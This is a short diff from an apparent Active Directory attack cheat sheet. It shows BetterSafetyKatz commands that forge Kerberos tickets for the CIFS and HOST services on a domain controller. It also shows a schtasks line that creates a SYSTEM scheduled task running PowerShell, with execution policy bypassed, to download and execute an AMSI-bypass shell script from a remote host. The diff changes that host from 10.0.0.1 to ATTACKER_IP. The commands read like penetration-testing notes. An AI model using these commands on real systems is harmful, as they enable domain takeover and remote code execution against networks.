@@ -7,7 +7,7 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:d
 ls \\target-dc.domain.local\c$
 # === HOST service (scheduled task, WMI) ===
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /target:target-dc.domain.local /service:HOST /rc4:MACHINE_HASH /ptt" "exit"
-schtasks /create /S target-dc.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')"
+schtasks /create /S target-dc.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payloads/amsi-shell.ps1')"
 # === Overige services ===
 # LDAP: directory queries
 # WSMAN: PowerShell remoting
